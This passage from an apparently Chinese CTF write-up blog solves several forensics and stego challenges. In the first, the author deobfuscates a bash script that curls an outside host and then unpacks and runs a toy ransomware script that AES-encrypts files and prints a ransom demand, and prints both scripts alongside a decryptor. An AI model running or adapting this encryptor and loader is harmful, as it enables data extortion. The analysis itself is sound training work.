class=p>;</span><span class=nv>hFz</span><span class=o>=</span><span class=s1>&#39;rt&#39;</span><span class=p>;</span><span class=nv>bFz</span><span class=o>=</span><span class=s1>&#39;3 &#39;</span><span class=p>;</span><span class=nv>lCz</span><span class=o>=</span><span class=s1>&#39;;a&#39;</span><span class=p>;</span><span class=nv>tCz</span><span class=o>=</span><span class=s1>&#39;;g&#39;</span><span class=p>;</span><span class=nv>pBz</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;s&#39;</span><span class=p>;</span><span class=nv>cDz</span><span class=o>=</span><span class=s1>&#39;ev&#39;</span><span class=p>;</span><span class=nv>uEz</span><span class=o>=</span><span class=s1>&#39; $&#39;</span><span class=p>;</span><span class=nv>BEz</span><span class=o>=</span><span class=s1>&#39;$W&#39;</span><span class=p>;</span><span class=nv>gEz</span><span class=o>=</span><span class=s1>&#39;$J&#39;</span><span class=p>;</span><span class=nv>NCz</span><span class=o>=</span><span class=s1>&#39;qz&#39;</span><span class=p>;</span><span class=nv>nCz</span><span class=o>=</span><span class=s1>&#39;Yz&#39;</span><span class=p>;</span><span class=nv>fz</span><span class=o>=</span><span class=s1>&#39;=$&#39;</span><span class=p>;</span><span class=nv>fEz</span><span class=o>=</span><span class=s1>&#39;$R&#39;</span><span class=p>;</span><span class=nv>Hz</span><span class=o>=</span><span class=s1>&#39;:/&#39;</span><span class=p>;</span><span class=nv>hBz</span><span class=o>=</span><span class=s1>&#39;G&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;&#39;</span><span class=p>;</span><span class=nv>wDz</span><span class=o>=</span><span class=s1>&#39;$S&#39;</span><span class=p>;</span><span class=nv>gCz</span><span class=o>=</span><span class=s1>&#39;+&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;&#39;</span><span class=p>;</span><span class=nv>aBz</span><span class=o>=</span><span class=s1>&#39;Iz&#39;</span><span class=p>;</span><span class=nv>Yz</span><span class=o>=</span><span class=s1>&#39;lo&#39;</span><span class=p>;</span><span class=nv>KCz</span><span class=o>=</span><span class=s1>&#39;^&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;&#39;</span><span class=p>;</span><span class=nv>rBz</span><span class=o>=</span><span class=s1>&#39;p&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Lz$Mz$Nz$Oz$Pz$Lz$Mz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Uz$Zz$az$z$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$z$qz$rz$kz$sz$tz$uz$vz$wz$xz$yz$ABz$tz$BBz$CBz$DBz$Tz$EBz$z$FBz$az$z$GBz$HBz$IBz$JBz$KBz$FBz$LBz$MBz$NBz$IBz$OBz$PBz$FBz$QBz$MBz$RBz$IBz$SBz$TBz$UBz$IBz$VBz$WBz$FBz$XBz$MBz$YBz$FBz$ZBz$MBz$aBz$IBz$bBz$cBz$UBz$IBz$dBz$eBz$FBz$fBz$MBz$gBz$IBz$hBz$iBz$FBz$jBz$MBz$kBz$IBz$lBz$mBz$UBz$IBz$nBz$oBz$FBz$pBz$MBz$qBz$IBz$rBz$sBz$FBz$tBz$MBz$uBz$FBz$vBz$MBz$wBz$IBz$xBz$yBz$FBz$ACz$MBz$BCz$FBz$CCz$MBz$DCz$FBz$ECz$MBz$FCz$IBz$GCz$HCz$FBz$ICz$MBz$JCz$IBz$KCz$LCz$FBz$MCz$MBz$NCz$IBz$OCz$PCz$FBz$QCz$MBz$RCz$IBz$SCz$TCz$UBz$IBz$UCz$VCz$UBz$IBz$WCz$XCz$FBz$YCz$MBz$ZCz$FBz$aCz$MBz$bCz$IBz$cCz$dCz$FBz$eCz$MBz$fCz$IBz$gCz$hCz$FBz$iCz$MBz$jCz$IBz$kCz$lCz$FBz$mCz$MBz$nCz$IBz$oCz$pCz$FBz$qCz$MBz$rCz$IBz$sCz$tCz$FBz$uCz$MBz$vCz$IBz$IBz$wCz$FBz$xCz$MBz$yCz$IBz$ADz$BDz$FBz$CDz$MBz$DDz$IBz$EDz$FDz$FBz$GDz$MBz$HDz$IBz$IDz$JDz$FBz$KDz$MBz$LDz$IBz$MDz$mBz$FBz$NDz$MBz$ODz$IBz$PDz$QDz$FBz$RDz$MBz$SDz$IBz$TDz$UDz$FBz$VDz$EDz$VDz$WDz$FBz$XDz$MBz$YDz$IBz$ZDz$aDz$FBz$bDz$MBz$z$cDz$dDz$kz$lz$eDz$UBz$fDz$eDz$RCz$gDz$eDz$HDz$hDz$eDz$iDz$jDz$eDz$kBz$gDz$eDz$HDz$kDz$eDz$lDz$lz$eDz$UBz$fDz$eDz$bCz$mDz$eDz$HBz$hDz$eDz$HDz$nDz$eDz$iDz$oDz$eDz$HDz$hDz$eDz$HDz$hDz$eDz$pDz$lz$eDz$UBz$qDz$eDz$RCz$gDz$eDz$pDz$hDz$eDz$iDz$jDz$eDz$rDz$sDz$eDz$aBz$tDz$eDz$uDz$vDz$eDz$DDz$wDz$eDz$rDz$xDz$eDz$bCz$hDz$eDz$HDz$yDz$eDz$iDz$AEz$eDz$DDz$BEz$eDz$CEz$DEz$eDz$EEz$FEz$eDz$GEz$HEz$eDz$iDz$AEz$eDz$DDz$BEz$eDz$IEz$JEz$eDz$EEz$hDz$eDz$pDz$KEz$eDz$gBz$LEz$eDz$MEz$mDz$eDz$NEz$OEz$eDz$lDz$PEz$eDz$gBz$QEz$eDz$REz$SEz$eDz$TEz$UEz$eDz$nCz$VEz$eDz$TEz$QEz$eDz$NCz$sz$eDz$WEz$XEz$eDz$NCz$SEz$eDz$TEz$tDz$eDz$vCz$nDz$eDz$HDz$hDz$eDz$iDz$jDz$eDz$rDz$YEz$eDz$bCz$hDz$eDz$HDz$nDz$eDz$iDz$jDz$eDz$rDz$ZEz$eDz$JCz$gDz$eDz$pDz$hDz$eDz$HDz$aEz$eDz$HDz$hDz$eDz$HDz$lz$eDz$UBz$fDz$eDz$bEz$sz$eDz$MEz$cEz$eDz$HBz$gDz$eDz$HDz$hDz$eDz$HDz$lz$UBz$AEz$eDz$EEz$mDz$eDz$dEz$AEz$eDz$EEz$kDz$eDz$iDz$oDz$eDz$eEz$hDz$eDz$HDz$hDz$eDz$eEz$oDz$eDz$ZCz$eDz$iDz$jDz$eDz$kBz$fDz$UBz$fEz$eDz$BCz$eDz$TEz$jDz$UBz$gEz$eDz$fCz$HEz$eDz$DCz$eDz$TEz$KEz$eDz$JCz$hEz$eDz$bCz$jDz$UBz$sDz$eDz$pDz$jDz$UBz$nDz$eDz$kBz$jDz$UBz$nDz$eDz$iEz$eDz$pDz$sDz$eDz$ZCz$eDz$BCz$eDz$fCz$gDz$UBz$nDz$eDz$wBz$nDz$eDz$pDz$jDz$UBz$nDz$eDz$pDz$lz$eDz$UBz$qDz$eDz$bEz$jEz$eDz$kEz$eDz$lEz$eDz$uBz$eDz$kEz$eDz$bCz$nDz$eDz$nCz$mEz$UBz$hDz$eDz$BCz$eDz$BCz$eDz$pDz$nDz$eDz$NCz$hDz$eDz$YBz$eDz$nEz$hDz$eDz$HDz$lz$eDz$UBz$qDz$eDz$bEz$sDz$eDz$lDz$gEz$UBz$oEz$eDz$uDz$fEz$eDz$BCz$eDz$wBz$gDz$eDz$HDz$hDz$eDz$HDz$hDz$eDz$BCz$eDz$pDz$hDz$eDz$HDz$nDz$eDz$iDz$jDz$eDz$rDz$YEz$eDz$bCz$nDz$pEz$z$qEz$rEz$sEz$tEz$uEz$vEz$wEz$xEz$yEz$AFz$BFz$CFz$DFz$bz$EFz$FFz$GFz$HFz$Kz$IFz$JFz$KFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$z$OFz$WFz$KFz$XFz$YFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$z$ZFz$aFz$dz$bFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$cFz$dFz$eFz$fFz$gFz$uz$hFz$iFz$jFz$SFz$kFz$lFz$mFz$z$nFz$Wz$sEz$oFz$z$CFz$AFz$pFz$qFz$Qz$Tz$Uz$rFz$sFz$tFz$uFz$ZFz$z$BFz</span><span class=s2>&#34;</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>Tips：在做取证题过程中如果发现文件较多，其实可以把文件按照时间排序一下，这样可以大大缩短定位时间</p></blockquote><p>是一个加了混淆的bash脚本，代码不长，我们可以手动解一下这个混淆</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>API_URL</span><span class=o>=</span><span class=s2>&#34;https://api.baidubaidubaidubaidubaidu.com/check/need/locked&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>response</span><span class=o>=</span><span class=k>$(</span>curl -s <span class=s2>&#34;</span><span class=nv>$API_URL</span><span class=s2>&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$response</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;yes&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl><span class=nb>eval</span> <span class=s1>&#39;printf &#34;cGFzaXdvZGU9IjE2MjU4ODg4Ijs=&#34; |  base64 -d&#39;</span>
</span></span><span class=line><span class=cl>unzip -P <span class=nv>$pasiwode</span> /firmware/RTL8125.bin -d /tmp/.check_update.py
</span></span><span class=line><span class=cl>chmod <span class=m>400</span> /tmp/.check_update.py
</span></span><span class=line><span class=cl>python3 /tmp/.check_update.py /root/important_data/* <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>sleep <span class=m>10</span>
</span></span><span class=line><span class=cl>rm /tmp/.check_update.py
</span></span><span class=line><span class=cl><span class=k>fi</span></span></span></code></pre></td></tr></table></div></div><p>其实就是base64解码得到压缩包解压密码：<code>16258888</code>，然后解压的过程，然后压缩包中的文件就是加密代码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218132440673.png alt=/posts/bb1da35/imgs/image-20241218132440673.png height=183 width=1734></p><p>因此我们接下来需要去找加密代码，发现7zip直接解压出来会丢失这部分的文件</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218133417809.png alt=/posts/bb1da35/imgs/image-20241218133417809.png height=1528 width=2560></p><p>所以我们使用<code>Disk Genius</code>的恢复文件功能去恢复加密的压缩包以及里面的加密代码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218132716931.png alt=/posts/bb1da35/imgs/image-20241218132716931.png height=1528 width=2560></p><p>改后缀为.zip，然后使用得到的压缩包密码解压即可得到加密代码，内容如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>pad</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NODecryptionForYouFFFFFFF</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>NODecryptionForYou1</span><span class=p>(</span><span class=n>NODecryptionForYou5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>NODecryptionForYou6</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>NODecryptionForYou5</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>NODecryptionForYou6</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>NODecryptionForYou2</span><span class=p>(</span><span class=n>NODecryptionForYou4</span><span class=p>,</span> <span class=n>NODecryptionForYou11</span><span class=p>,</span> <span class=n>NODecryptionForYou12</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>NODecryptionForYou4</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>NODecryptionForYou11</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>NODecryptionForYouMAN8IN</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>NODecryptionForYou7</span> <span class=o>=</span> <span class=n>NODecryptionForYouMAN8IN</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>NODecryptionForYou8</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>iv</span> <span class=o>+</span> <span class=n>cipher</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>pad</span><span class=p>(</span><span class=n>NODecryptionForYou7</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>NODecryptionForYou12</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>NODecryptionForYouMAN8OUT</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>NODecryptionForYouMAN8OUT</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>NODecryptionForYou8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NODecryptionForYou5</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>NODecryptionForYou4</span> <span class=o>=</span> <span class=n>NODecryptionForYou1</span><span class=p>(</span><span class=n>NODecryptionForYou5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>NODecryptionForYou3</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>NODecryptionForYou5</span><span class=si>}</span><span class=s1>.locked&#39;</span>
</span></span><span class=line><span class=cl><span class=n>NODecryptionForYou2</span><span class=p>(</span><span class=n>NODecryptionForYou4</span><span class=p>,</span> <span class=n>NODecryptionForYouFFFFFFF</span><span class=p>,</span> <span class=n>NODecryptionForYou3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;SEND 1000 BTC TO [asdjjkh1iuhfihuiu1yrueo-this-is-fake-addr] for decryption, OR WE WILL LEAK ALL YOU DATA!!!&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>代码逻辑并不复杂，就是用时间戳MD5值的前16位作为key去进行AES-CBC加密，然后IV保存在加密后文件的前16字节中</p><p>解密的思路也比较简单，懒得自己手写了，直接GPT秒了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>NODecryptionForYou1</span><span class=p>(</span><span class=n>timestamp</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 通过时间戳生成密钥</span>
</span></span><span class=line><span class=cl>    <span class=n>NODecryptionForYou6</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>timestamp</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>NODecryptionForYou6</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>NODecryptionForYou2</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>enc_file</span><span class=p>,</span> <span class=n>output_file</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>enc_file</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>enc_data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 从加密文件中提取 IV 和密文</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span> <span class=o>=</span> <span class=n>enc_data</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span>  <span class=c1># 前 16 字节是 IV</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher_text</span> <span class=o>=</span> <span class=n>enc_data</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>  <span class=c1># 剩下的是密文</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 使用 AES CBC 模式进行解密</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypted_data</span> <span class=o>=</span> <span class=n>unpad</span><span class=p>(</span><span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>cipher_text</span><span class=p>),</span> <span class=n>AES</span><span class=o>.</span><span class=n>block_size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 将解密后的数据保存到输出文件</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>output_file</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>decrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>timestamp</span> <span class=o>=</span> <span class=mi>1732250675</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>NODecryptionForYou1</span><span class=p>(</span><span class=n>timestamp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>enc_file</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>timestamp</span><span class=si>}</span><span class=s1>.locked&#39;</span>  <span class=c1># 加密文件</span>
</span></span><span class=line><span class=cl><span class=n>output_file</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>timestamp</span><span class=si>}</span><span class=s1>.decrypted&#39;</span>  <span class=c1># 解密后的文件</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>NODecryptionForYou2</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>enc_file</span><span class=p>,</span> <span class=n>output_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;File decrypted successfully! Output saved as </span><span class=si>{</span><span class=n>output_file</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>运行以上代码，发现解密后的文件是一个zip压缩包，因此改后缀位.zip并解压可以得到一个<code>重要数据.docx</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218133157811.png alt=/posts/bb1da35/imgs/image-20241218133157811.png height=865 width=1723></p><p>打开DOCX即可得到flag：<code>flag{851bd91f4a8168d2d719ab69eb1423f9}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241218133121093.png alt=/posts/bb1da35/imgs/image-20241218133121093.png height=1528 width=2560></p><h2 class=heading-element id=题目名称-莉可丽丝迅岚安全杯><span>题目名称 莉可丽丝(迅岚安全杯)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e8%8e%89%e5%8f%af%e4%b8%bd%e4%b8%9d%e8%bf%85%e5%b2%9a%e5%ae%89%e5%85%a8%e6%9d%af class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个压缩包，解压后可以得到一张<code>莉可丽丝 .jpg</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241221163917350.png alt=/posts/bb1da35/imgs/image-20241221163917350.png height=1108 width=1902></p><p>010打开发现末尾藏了一个7z压缩包</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241221163939567.png alt=/posts/bb1da35/imgs/image-20241221163939567.png height=1528 width=2560></p><p>提取出来后尝试使用弱密码字典爆破，得到解压密码<code>1234567890</code></p><blockquote><p>Tips：7z的弱密码字典爆破可能会有点慢，使用<code>passware kit</code>爆破可能会稍微快一点</p></blockquote><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241221163949601.png alt=/posts/bb1da35/imgs/image-20241221163949601.png height=1455 width=1911></p><p>解压后得到一个类似于PPTX结构的文件夹，因此我们压缩为zip并改后缀为.pptx</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241221164016806.png alt=/posts/bb1da35/imgs/image-20241221164016806.png height=393 width=1285></p><p>打开PPTX文件，删除覆盖在上面的文字和图片，发现最下面有一行白色的文字，改个颜色即可得到flag：<code>flag{geigei_zhen_de_hao_li_hai} </code><img loading=lazy src=/posts/bb1da35/imgs/image-20241221164132989.png alt=/posts/bb1da35/imgs/image-20241221164132989.png height=1528 width=2560></p><h2 class=heading-element id=题目名称-电音><span>题目名称 电音</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e7%94%b5%e9%9f%b3 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>附件给了一个wav和一个加密的压缩包</p><p>wav用au打开查看频谱图可以看到一个二维码</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225235620648.png alt=/posts/bb1da35/imgs/image-20241225235620648.png height=2138 width=3420></p><p>截个图然后用PPT拼一下可以得到下面这张二维码，扫码得到<code>qr1sc0ol&</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241225235752506.png alt=/posts/bb1da35/imgs/image-20241225235752506.png height=1280 width=2144></p><p>因此猜测还有后半段的解压密码，仔细查看那个wav文件，尝试把前面二维码的内容删除</p><p>把剩下的内容<code>效果器-音量与压缩-增幅</code>，然后再播放，发现是DTMF电话音</p><p>直接用<a href=https://github.com/ribt/dtmf-decoder target=_blank rel="external nofollow noopener noreferrer">GitHub - ribt/dtmf-decoder</a> 这个项目识别一下可以得到：<code>3863334447777222666666555</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241226000856436.png alt=/posts/bb1da35/imgs/image-20241226000856436.png height=314 width=1720></p><p>然后联想到手机键盘密码，根据下面这个对照表得到<code>dtmfiscool</code></p><p>感谢烛影✌提供的对照表</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20241226092225804.jpeg alt=/posts/bb1da35/imgs/image-20241226092225804.jpeg height=712 width=275></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>3 8 6 333 444 7777 222 666 666 555
</span></span><span class=line><span class=cl>d t m f    i    s   c   o   o   l</span></span></code></pre></td></tr></table></div></div><p>因此压缩包的解压密码为<code>qr1sc0ol&amp;dtmfiscool</code>，解压即可得到flag：<code>flag{b606eea7-16e4-4b41-9efc-ca000429480f}</code></p><h2 class=heading-element id=题目名称-coffee_loving_cat天权信安ctf><span>题目名称 Coffee_loving_cat(天权信安CTF)</span>
